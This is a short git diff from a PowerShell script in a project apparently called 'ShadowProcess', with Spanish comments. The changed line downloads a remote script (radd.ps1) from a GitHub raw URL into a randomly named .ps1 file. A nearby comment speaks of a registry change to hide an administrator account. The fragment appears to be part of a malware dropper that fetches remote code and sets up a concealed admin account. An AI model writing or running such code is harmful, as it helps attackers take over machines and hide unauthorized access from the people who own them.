@@ -43,7 +43,7 @@ cd $path
 
 #Descargar de reg para añadir
 $radd_file = random_text
-Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/confirm.vbs -OutFile "$radd_file.ps1"
+Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/radd.ps1 -OutFile "$radd_file.ps1"
 
 #registro para esconder administrador
 #$reg_file = random_text 
